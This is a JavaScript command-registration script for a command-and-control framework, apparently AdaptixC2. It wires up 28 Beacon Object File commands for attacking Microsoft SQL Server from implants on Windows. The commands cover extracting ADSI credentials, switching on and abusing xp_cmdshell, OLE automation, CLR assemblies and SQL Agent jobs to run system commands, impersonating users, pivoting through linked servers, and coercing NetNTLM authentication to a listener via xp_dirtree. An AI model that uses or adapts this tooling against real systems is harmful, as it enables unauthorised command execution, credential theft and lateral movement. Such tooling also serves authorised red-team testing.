var metadata = {
    name: "SQL-BOF",
    description: "Microsoft SQL Server BOF"
};


var cmd_sql_1434udp = ax.create_command("sql-1434udp", "Obtain SQL Server connection information from 1434/UDP", "sql-1434udp [serverIP]");
cmd_sql_1434udp.addArgString("serverIP", "SQL Server IP", "");

cmd_sql_1434udp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let serverIP = parsed_json["serverIP"];

    let bof_params = ax.bof_pack("cstr", [serverIP]);
    let bof_path = ax.script_dir() + "/1434udp/1434udp." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Obtain SQL Server connection information"
    );
});


var cmd_sql_adsi = ax.create_command("sql-adsi", "Obtain ADSI creds from ADSI linked server", "sql-adsi [server] [adsiserver] [opt: port] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_adsi.addArgString("server", "SQL server to connect to", "");
cmd_sql_adsi.addArgString("adsiserver", "ADSI linked server name or address", "");
cmd_sql_adsi.addArgInt("port", "Optional: ADSI port", 0);
cmd_sql_adsi.addArgString("database", "Optional: Database to use", "");
cmd_sql_adsi.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_adsi.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_adsi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let adsiserver  = parsed_json["adsiserver"];
    let port        = parsed_json["port"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr,int",
        [server, database, linkedserver, impersonate, adsiserver, port]
    );
    let bof_path = ax.script_dir() + "/adsi/adsi." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Obtain ADSI credentials"
    );
});

var cmd_sql_agentcmd = ax.create_command("sql-agentcmd", "Execute a system command using agent jobs", "sql-agentcmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_agentcmd.addArgString("server", "SQL server to connect to", "");
cmd_sql_agentcmd.addArgString("command", "System command to execute via agent job", "");
cmd_sql_agentcmd.addArgString("database", "Optional: Database to use", "");
cmd_sql_agentcmd.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_agentcmd.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_agentcmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let command     = parsed_json["command"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";
    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate, command]
    );
    let bof_path = ax.script_dir() + "/agentcmd/agentcmd." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Execute system command via SQL Agent"
    );
});

var cmd_sql_agentstatus = ax.create_command("sql-agentstatus", "Enumerate SQL Agent status and jobs", "sql-agentstatus [server] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_agentstatus.addArgString("server", "SQL server to connect to", "");
cmd_sql_agentstatus.addArgString("database", "Optional: Database to use", "");
cmd_sql_agentstatus.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_agentstatus.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_agentstatus.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";
    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate]
    );
    let bof_path = ax.script_dir() + "/agentstatus/agentstatus." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Enumerate SQL Agent status and jobs"
    );
});

var cmd_sql_checkrpc = ax.create_command("sql-checkrpc", "Enumerate RPC status of linked servers", "sql-checkrpc [server] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_checkrpc.addArgString("server", "SQL server to connect to", "");
cmd_sql_checkrpc.addArgString("database", "Optional: Database to use", "");
cmd_sql_checkrpc.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_checkrpc.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_checkrpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate]
    );
    let bof_path = ax.script_dir() + "/checkrpc/checkrpc." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Enumerate RPC status on linked servers"
    );
});

var cmd_sql_clr = ax.create_command("sql-clr", "Load and execute a .NET assembly in a stored procedure", "sql-clr [server] [dll_path] [function] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_clr.addArgString("server", "SQL server to connect to", "");
cmd_sql_clr.addArgString("dll_path", "Path to the .NET assembly DLL", "");
cmd_sql_clr.addArgString("function", "Entry-point function name", "");
cmd_sql_clr.addArgString("database", "Optional: Database to use", "");
cmd_sql_clr.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_clr.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_clr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let dllPath     = parsed_json["dll_path"];
    let functionName= parsed_json["function"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr,cstr",
        [server, dllPath, functionName, database, linkedserver, impersonate]
    );
    let bof_path = ax.script_dir() + "/clr/clr." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Load and execute .NET assembly"
    );
});

var cmd_sql_columns = ax.create_command("sql-columns", "Enumerate columns within a table", "sql-columns [server] [table] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_columns.addArgString("server", "SQL server to connect to", "");
cmd_sql_columns.addArgString("table", "Table to enumerate columns from", "");
cmd_sql_columns.addArgString("database", "Optional: Database to use", "");
cmd_sql_columns.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_columns.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_columns.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let table       = parsed_json["table"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr",
        [server, database, table, linkedserver, impersonate]
    );
    let bof_path = ax.script_dir() + "/columns/columns." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Enumerate columns in table");
});


var cmd_sql_databases = ax.create_command("sql-databases", "Enumerate SQL databases", "sql-databases [server] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_databases.addArgString("server", "SQL server to connect to", "");
cmd_sql_databases.addArgString("database", "Optional: Database to use", "");
cmd_sql_databases.addArgString("linkedserver", "Optional: Execute query through linked server", "");
cmd_sql_databases.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_databases.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server = parsed_json["server"];
    let database = parsed_json["database"] || "";
    let linkedserver = parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate]);
    let bof_path = ax.script_dir() + "/databases/databases." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: SQL Server whoami BOF");
});

var cmd_sql_disableclr = ax.create_command("sql-disableclr", "Disable CLR integration", "sql-disableclr [server] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_disableclr.addArgString("server", "SQL server to connect to", "");
cmd_sql_disableclr.addArgString("database", "Optional: Database to use", "");
cmd_sql_disableclr.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_disableclr.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_disableclr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate, "clr enabled", "0"]
    );
    let bof_path = ax.script_dir() + "/togglemodule/togglemodule." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Disable CLR integration");
});

var cmd_sql_disableole = ax.create_command("sql-disableole", "Disable OLE Automation Procedures", "sql-disableole [server] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_disableole.addArgString("server", "SQL server to connect to", "");
cmd_sql_disableole.addArgString("database", "Optional: Database to use", "");
cmd_sql_disableole.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_disableole.addArgString("impersonate", "Optional: User to impersonate during execution", "");
cmd_sql_disableole.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";
    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate, "Ole Automation Procedures", "0"]
    );
    let bof_path = ax.script_dir() + "/togglemodule/togglemodule." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Disable OLE Automation");
});

var cmd_sql_disablerpc = ax.create_command("sql-disablerpc", "Disable RPC and RPC out on a linked server", "sql-disablerpc [server] [linkedserver] [opt: database] [opt: impersonate]");
cmd_sql_disablerpc.addArgString("server", "SQL server to connect to", "");
cmd_sql_disablerpc.addArgString("linkedserver", "Linked server name", "");
cmd_sql_disablerpc.addArgString("database", "Optional: Database to use", "");
cmd_sql_disablerpc.addArgString("impersonate", "Optional: User to impersonate during execution", "");
cmd_sql_disablerpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let linkedserver= parsed_json["linkedserver"];
    let database    = parsed_json["database"] || "";
    let impersonate = parsed_json["impersonate"] || "";
    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr,cstr",
        [server, linkedserver, database, impersonate, "rpc", "FALSE"]
    );
    let bof_path = ax.script_dir() + "/togglemodule/togglemodule." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Disable RPC on linked server");
});

var cmd_sql_disablexp = ax.create_command("sql-disablexp", "Disable xp_cmdshell", "sql-disablexp [server] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_disablexp.addArgString("server", "SQL server to connect to", "");
cmd_sql_disablexp.addArgString("database", "Optional: Database to use", "");
cmd_sql_disablexp.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_disablexp.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_disablexp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"] || "";
    let linkedserver = parsed_json["linkedserver"] || "";
    let impersonate  = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate, "xp_cmdshell", "0"]
    );
    let bof_path = ax.script_dir() + "/togglemodule/togglemodule." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Disable xp_cmdshell"
    );
});

var cmd_sql_enableclr = ax.create_command("sql-enableclr", "Enable CLR integration", "sql-enableclr [server] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_enableclr.addArgString("server", "SQL server to connect to", "");
cmd_sql_enableclr.addArgString("database", "Optional: Database to use", "");
cmd_sql_enableclr.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_enableclr.addArgString("impersonate", "Optional: User to impersonate during execution", "");
cmd_sql_enableclr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";
    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate, "clr enabled", "1"]
    );
    let bof_path = ax.script_dir() + "/togglemodule/togglemodule." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Enable CLR integration");
});

var cmd_sql_enableole = ax.create_command("sql-enableole", "Enable OLE Automation Procedures", "sql-enableole [server] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_enableole.addArgString("server", "SQL server to connect to", "");
cmd_sql_enableole.addArgString("database", "Optional: Database to use", "");
cmd_sql_enableole.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_enableole.addArgString("impersonate", "Optional: User to impersonate during execution", "");
cmd_sql_enableole.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";
    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate, "Ole Automation Procedures", "1"]
    );
    let bof_path = ax.script_dir() + "/togglemodule/togglemodule." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Enable OLE Automation Procedures");
});


var cmd_sql_enablerpc = ax.create_command("sql-enablerpc", "Enable RPC and RPC out on a linked server", "sql-enablerpc [server] [linkedserver] [opt: database] [opt: impersonate]");
cmd_sql_enablerpc.addArgString("server", "SQL server to connect to", "");
cmd_sql_enablerpc.addArgString("linkedserver", "Linked server name", "");
cmd_sql_enablerpc.addArgString("database", "Optional: Database to use", "");
cmd_sql_enablerpc.addArgString("impersonate", "Optional: User to impersonate during execution", "");
cmd_sql_enablerpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let linkedserver= parsed_json["linkedserver"];
    let database    = parsed_json["database"] || "";
    let impersonate = parsed_json["impersonate"] || "";
    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate, "rpc", "TRUE"]
    );
    let bof_path = ax.script_dir() + "/togglemodule/togglemodule." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: Enable RPC on linked server");
});

var cmd_sql_enablexp = ax.create_command("sql-enablexp", "Enable xp_cmdshell", "sql-enablexp [server] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_enablexp.addArgString("server", "SQL server to connect to", "");
cmd_sql_enablexp.addArgString("database", "Optional: Database to use", "");
cmd_sql_enablexp.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_enablexp.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_enablexp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"] || "";
    let linkedserver = parsed_json["linkedserver"] || "";
    let impersonate  = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate, "xp_cmdshell", "1"]
    );
    let bof_path = ax.script_dir() + "/togglemodule/togglemodule." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Enable xp_cmdshell"
    );
});

var cmd_sql_impersonate = ax.create_command("sql-impersonate", "Enumerate users that can be impersonated", "sql-impersonate [server] [opt: database]");
cmd_sql_impersonate.addArgString("server", "SQL server to connect to", "");
cmd_sql_impersonate.addArgString("database", "Optional: Database to use", "");

cmd_sql_impersonate.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server   = parsed_json["server"];
    let database = parsed_json["database"] || "";


    let bof_params = ax.bof_pack("cstr,cstr", [server, database]);
    let bof_path = ax.script_dir() + "/impersonate/impersonate." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: SQL Server impersonation enumeration"
    );
});


var cmd_sql_info = ax.create_command("sql-info", "Gather information about the SQL Server", "sql-info [server] [opt: database]");
cmd_sql_info.addArgString("server", "SQL server to connect to", "");
cmd_sql_info.addArgString("database", "Optional: Database to use", "");

cmd_sql_info.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server   = parsed_json["server"];
    let database = parsed_json["database"] || "";


    let bof_params = ax.bof_pack("cstr,cstr", [server, database]);
    let bof_path = ax.script_dir() + "/info/info." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: SQL Server impersonation enumeration"
    );
});


var cmd_sql_links = ax.create_command("sql-links", "Enumerate linked servers", "sql-links [server] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_links.addArgString("server", "SQL server to connect to", "");
cmd_sql_links.addArgString("database", "Optional: Database to use", "");
cmd_sql_links.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_links.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_links.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate]
    );
    let bof_path = ax.script_dir() + "/links/links." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Enumerate linked servers"
    );
});

var cmd_sql_olecmd = ax.create_command("sql-olecmd", "Execute a system command using OLE automation procedures", "sql-olecmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_olecmd.addArgString("server", "SQL server to connect to", "");
cmd_sql_olecmd.addArgString("command", "System command to execute via OLE automation", "");
cmd_sql_olecmd.addArgString("database", "Optional: Database to use", "");
cmd_sql_olecmd.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_olecmd.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_olecmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let command     = parsed_json["command"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate, command]
    );
    let bof_path = ax.script_dir() + "/olecmd/olecmd." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Execute command via OLE automation"
    );
});

var cmd_sql_query = ax.create_command("sql-query", "Execute a custom SQL query", "sql-query [server] [query] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_query.addArgString("server", "SQL server to connect to", "");
cmd_sql_query.addArgString("query", "Query to execute", "");
cmd_sql_query.addArgString("database", "Optional: Database to use", "");
cmd_sql_query.addArgString("linkedserver", "Optional: Execute query through linked server", "");
cmd_sql_query.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_query.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server = parsed_json["server"];
    let query = parsed_json["query"];
    let database = parsed_json["database"] || "";
    let linkedserver = parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

 
    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, query]);
    let bof_path = ax.script_dir() + "/query/query." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: SQL Server custom query execution");
});

var cmd_sql_rows = ax.create_command("sql-rows", "Get the count of rows in a table", "sql-rows [server] [table] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_rows.addArgString("server", "SQL server to connect to", "");
cmd_sql_rows.addArgString("table", "Table to count rows from", "");
cmd_sql_rows.addArgString("database", "Optional: Database to use", "");
cmd_sql_rows.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_rows.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_rows.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let table       = parsed_json["table"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr",
        [server, database, table, linkedserver, impersonate]
    );
    let bof_path = ax.script_dir() + "/rows/rows." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Count rows in table"
    );
});

var cmd_sql_search = ax.create_command("sql-search","Search a table for a column name","sql-search [server] [keyword] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_search.addArgString("server", "SQL server to connect to", "");
cmd_sql_search.addArgString("keyword", "Column name keyword to search for", "");
cmd_sql_search.addArgString("database", "Optional: Database to use", "");
cmd_sql_search.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_search.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_search.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let keyword     = parsed_json["keyword"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate, keyword]
    );
    let bof_path = ax.script_dir() + "/search/search." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Search for column names"
    );
});

var cmd_sql_smb = ax.create_command("sql-smb", "Coerce NetNTLM auth via xp_dirtree", "sql-smb [server] [\\\\listener] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_smb.addArgString("server", "SQL server to connect to", "");
cmd_sql_smb.addArgString("listener", "UNC path listener (e.g., \\\\host\\share)", "");
cmd_sql_smb.addArgString("database", "Optional: Database to use", "");
cmd_sql_smb.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_smb.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_smb.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let listener    = parsed_json["listener"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate, listener]
    );
    let bof_path = ax.script_dir() + "/smb/smb." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: SQL Server SMB relay via xp_dirtree"
    );
});


var cmd_sql_tables = ax.create_command("sql-tables", "Enumerate tables within a database", "sql-tables [server] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_tables.addArgString("server", "SQL server to connect to", "");
cmd_sql_tables.addArgString("database", "Optional: Database to use", "");
cmd_sql_tables.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_tables.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_tables.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"] || "";
    let linkedserver = parsed_json["linkedserver"] || "";
    let impersonate  = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate]
    );
    let bof_path = ax.script_dir() + "/tables/tables." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Enumerate Tables"
    );
});

var cmd_sql_users = ax.create_command("sql-users","Enumerate users with database access","sql-users [server] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_users.addArgString("server", "SQL server to connect to", "");
cmd_sql_users.addArgString("database", "Optional: Database to use", "");
cmd_sql_users.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_users.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_users.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate]
    );
    let bof_path = ax.script_dir() + "/users/users." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: Enumerate users with database access"
    );
});

var cmd_sql_whoami = ax.create_command("sql-whoami", "Gather logged in user, mapped user and roles from SQL server", "sql-whoami [server] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_whoami.addArgString("server", "SQL server to connect to", "");
cmd_sql_whoami.addArgString("database", "Optional: Database to use", "");
cmd_sql_whoami.addArgString("linkedserver", "Optional: Execute query through linked server", "");
cmd_sql_whoami.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_whoami.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server = parsed_json["server"];
    let database = parsed_json["database"] || "";
    let linkedserver = parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate]);
    let bof_path = ax.script_dir() + "/whoami/whoami." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: SQL Server whoami BOF");
});


var cmd_sql_xpcmd = ax.create_command("sql-xpcmd", "Execute a system command via xp_cmdshell", "sql-xpcmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]");
cmd_sql_xpcmd.addArgString("server", "SQL server to connect to", "");
cmd_sql_xpcmd.addArgString("command", "Command to execute via xp_cmdshell", "");
cmd_sql_xpcmd.addArgString("database", "Optional: Database to use", "");
cmd_sql_xpcmd.addArgString("linkedserver", "Optional: Execute through linked server", "");
cmd_sql_xpcmd.addArgString("impersonate", "Optional: User to impersonate during execution", "");

cmd_sql_xpcmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let command     = parsed_json["command"];
    let database    = parsed_json["database"] || "";
    let linkedserver= parsed_json["linkedserver"] || "";
    let impersonate = parsed_json["impersonate"] || "";

    let bof_params = ax.bof_pack(
        "cstr,cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate, command]
    );
    let bof_path = ax.script_dir() + "/xpcmd/xpcmd." + ax.arch(id) + ".o";

    ax.execute_alias(
        id,
        cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: SQL Server xp_cmdshell execution"
    );
});


var group_sql = ax.create_commands_group("SQL-BOF", [
    cmd_sql_1434udp,
    cmd_sql_adsi,
    cmd_sql_agentcmd,
    cmd_sql_agentstatus,
    cmd_sql_checkrpc,
    cmd_sql_clr,
    cmd_sql_columns,
    cmd_sql_databases,
    cmd_sql_disableclr,
    cmd_sql_disableole,
    cmd_sql_disablerpc,
    cmd_sql_disablexp,
    cmd_sql_enableclr,
    cmd_sql_enableole,
    cmd_sql_enablerpc,
    cmd_sql_enablexp,
    cmd_sql_impersonate,
    cmd_sql_info,
    cmd_sql_links,
    cmd_sql_olecmd,
    cmd_sql_query,
    cmd_sql_rows,
    cmd_sql_search,
    cmd_sql_smb,
    cmd_sql_tables,
    cmd_sql_users,
    cmd_sql_whoami,
    cmd_sql_xpcmd
]);
ax.register_commands_group(group_sql, ["beacon", "gopher"], ["windows"], []);
